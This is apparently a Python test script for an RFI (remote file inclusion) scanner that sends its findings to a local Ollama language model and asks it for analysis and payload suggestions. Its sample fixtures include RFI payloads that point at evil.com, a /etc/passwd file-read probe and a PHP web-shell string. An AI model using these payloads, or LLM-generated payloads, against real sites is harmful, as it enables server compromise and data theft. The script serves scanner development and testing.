#!/usr/bin/env python3
"""
Test Ollama Integration
======================

This script tests the Ollama integration with the RFI scanner.
"""

import asyncio
import sys
import os

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

async def test_ollama_client():
    """Test the Ollama client functionality"""
    print("Testing Ollama Client Integration...")
    print("=" * 50)
    
    try:
        from ollama_client import OllamaClient, OllamaConfig
        
        # Create client
        client = OllamaClient()
        
        # Test connection
        print("1. Testing connection...")
        is_connected = await client.check_connection()
        if is_connected:
            print("✓ Ollama is running and accessible")
        else:
            print("✗ Ollama is not running or not accessible")
            print("Please start Ollama with: ollama serve")
            return False
        
        # Test model listing
        print("\n2. Testing model listing...")
        models = await client.list_models()
        if models:
            print("✓ Available models:")
            for model in models:
                print(f"  - {model.get('name', 'Unknown')}")
        else:
            print("⚠ No models found. Install with: ollama pull llama2")
        
        # Test basic response
        print("\n3. Testing basic response...")
        response = await client.generate_response("Hello, how are you?")
        if response.error:
            print(f"✗ Response failed: {response.error}")
        else:
            print(f"✓ Response received ({response.response_time:.2f}s):")
            print(f"  Model: {response.model}")
            print(f"  Content: {response.content[:100]}...")
        
        # Test scan results analysis
        print("\n4. Testing scan results analysis...")
        sample_results = [
            {
                'url': 'http://example.com/page.php?id=',
                'vulnerable': True,
                'response_code': 200,
                'response_size': 1500,
                'payload_used': 'http://evil.com/shell.txt?',
                'response_preview': 'root:x:0:0:root:/root:/bin/bash...',
                'scan_time': 1.23
            },
            {
                'url': 'http://example.com/admin.php?file=',
                'vulnerable': False,
                'response_code': 404,
                'response_size': 150,
                'payload_used': '/etc/passwd',
                'response_preview': '404 Not Found',
                'scan_time': 0.85
            }
        ]
        
        analysis = await client.analyze_scan_results(sample_results)
        if analysis and not analysis.startswith("Analysis failed"):
            print("✓ AI analysis completed successfully")
            print(f"  Analysis length: {len(analysis)} characters")
        else:
            print(f"✗ AI analysis failed: {analysis}")
        
        return True
        
    except ImportError as e:
        print(f"✗ Import error: {e}")
        print("Make sure ollama_client.py is in the same directory")
        return False
    except Exception as e:
        print(f"✗ Test failed: {e}")
        return False

async def test_integration_with_scanner():
    """Test integration with the main scanner"""
    print("\n" + "=" * 50)
    print("Testing Integration with RFI Scanner...")
    print("=" * 50)
    
    try:
        # Import the scanner components
        from modern_rfi_scanner import ScanResult, OllamaClient, OllamaConfig
        
        # Create sample scan results
        sample_results = [
            ScanResult(
                url="http://test.com/page.php?id=",
                vulnerable=True,
                response_code=200,
                response_size=1200,
                payload_used="http://evil.com/test.txt?",
                response_preview="<?php system($_GET['cmd']); ?>",
                scan_time=1.5
            ),
            ScanResult(
                url="http://test.com/admin.php?file=",
                vulnerable=False,
                response_code=403,
                response_size=200,
                payload_used="/etc/passwd",
                response_preview="Forbidden",
                scan_time=0.8
            )
        ]
        
        # Test AI analysis
        client = OllamaClient()
        if await client.check_connection():
            print("✓ Integration test - Ollama connection successful")
            
            # Test payload suggestions
            suggestions = await client.generate_payload_suggestions(
                "http://test.com/page.php?id=",
                "PHP application with GET parameter"
            )
            
            if suggestions and not suggestions.startswith("Payload generation failed"):
                print("✓ Integration test - Payload suggestions working")
            else:
                print("⚠ Integration test - Payload suggestions failed")
            
            # Test vulnerability explanation
            vuln_data = {
                'type': 'RFI',
                'url': 'http://test.com/page.php?id=',
                'payload': 'http://evil.com/shell.txt?',
                'response': '<?php system($_GET["cmd"]); ?>'
            }
            
            explanation = await client.explain_vulnerability(vuln_data)
            if explanation and not explanation.startswith("Explanation failed"):
                print("✓ Integration test - Vulnerability explanation working")
            else:
                print("⚠ Integration test - Vulnerability explanation failed")
                
        else:
            print("✗ Integration test - Ollama not available")
            
    except Exception as e:
        print(f"✗ Integration test failed: {e}")

def main():
    """Main test function"""
    print("Ollama Integration Test Suite")
    print("=" * 60)
    
    # Run tests
    success = asyncio.run(test_ollama_client())
    
    if success:
        asyncio.run(test_integration_with_scanner())
    
    print("\n" + "=" * 60)
    if success:
        print("✓ All tests completed successfully!")
        print("\nTo use Ollama with the scanner:")
        print("  python modern_rfi_scanner.py --targets targets.txt --ai-analysis")
        print("\nTo use Ollama in VS Code:")
        print("  Press Ctrl+Shift+P and search for 'Ollama' commands")
    else:
        print("✗ Some tests failed. Please check Ollama installation.")
        print("\nInstallation instructions:")
        print("  1. Install Ollama: https://ollama.ai")
        print("  2. Start Ollama: ollama serve")
        print("  3. Pull a model: ollama pull llama2")
        print("  4. Install Python dependencies: pip install -r requirements.txt")

if __name__ == "__main__":
    main()